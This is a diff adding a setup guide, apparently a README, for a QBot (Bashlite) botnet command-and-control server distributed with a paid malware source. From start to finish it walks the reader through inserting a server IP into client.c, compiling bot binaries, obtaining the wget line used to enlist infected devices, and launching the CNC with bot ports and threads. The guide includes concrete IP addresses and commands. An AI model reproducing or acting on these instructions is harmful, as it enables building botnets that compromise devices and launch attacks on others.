@@ -1,0 +1,61 @@
+Step 1: Get your vps ip address and copy it, go into client.c file
+go to line 96 and highlight 178.128.128.249 click CTRL F at the same time
+and click "replace" option and paste ur ip of ur server in "Replace with"
+then click "Replace all" (DO NOT FUCKING TOUCH ANYTHING ELSE) make sure to save
+changes
+
+Step 2:Drag all your files into ur vps root directory lols
+(That should be simple it takes no skill what so ever)
+
+Step 3: Run this command in your centos 6 server
+yum install python paramiko -y
+this is basicly all u really need since i made qbot.py to make things easy
+
+Step 4: When its done and python paramiko is installed on your centos machine run this
+python qbot.py 
+So now in the middle of running "python qbot.py" as its installing everything basicly
+its gonna open something its gonna say "GNU nano" at the top this is were u creat your login
+so make a login for example i want my username to be "root" and i want my password to be "root"
+your gonna need to this to be able to login into the net sooo type ur username click the space bar < 1 time 
+and type in a password
+Noww this may be tricky for some of u but ounce u have ur login in click CTRL AND X at the same time
+its gonna give u two options click the "Y" key on ur keyboard and click enter
+AND DONE WITH ALL DAT
+
+Step 5: Ounce we got all that out the way and u fully ran the "python qbot.py"
+all u need to do is compile ur archs so if u didnt change the botport in the client.c
+run this python cc.py client.c 206.189.169.221
+sooo for example my server ip is 206.189.169.221 soo i put it at the end of the command
+u put ur vps ip at the end (P.S YOUR IP MUST BE IN THE CLIENT.C) but that was the first step lel
+i hope none of u are that stupid to skip the most important step...
+anyways when u type ur command click the enter key and its gonna say "Download Dem Binaryz [y/n]:"
+click the y key and click enter now wait... its gonna give you ur wget save it ur gonna need it for bots to join
+
+Step 6: That was easy right ?? ok now that we basicly have all that done i like to reboot the server
+(THIS IS NOT NEEDED BUT I STILL DO IT)
+soo if u wanna do it with me follow me type reboot in ur vps
+its gonna reboot ur server and wait maybe 1 min to open it again
+Now thats it back up paste all this in ur vps at ounce
+and click enter 
+
+service vsftpd start
+service httpd start
+service mysqld start
+service xinetd start
+
+Step 7: Run ulimit -n 999999
+now screen ur server like this
+screen ./server 1994 500 2
+Basicly the 1994 is the botport in the client.c if u screen with a botport that its not
+in the client.c then bots wont fucking join for example if 1994 was not in the client.c as i type this and i screened it
+with 1994 then bots wouldnt join
+
+Basicly the 500 is the threads the cnc is screened on (DONT FUCKING CHANGE)
+
+Basicly the 1337 is the connect port you connect Via putty with it
+
+ANYWAYS THANKS I HOPE I HELPED SOME DUMBASSES THAT DONT KNO HOW TO SETUP A SIMPLE FUCKING QBOT LMAO BYEE BYEE
+NEED HELP ??? TEXT ME ON INSTAGRAM IF I DONT REPLY IM MOSTLIKLY SLEEP DONT SPAM ME AND DONT BOTHER TEXTING ME IF 
+YOU DIDNT PAY FOR THE MODZ V4 SOURCE OK BYE PPL...
+
+
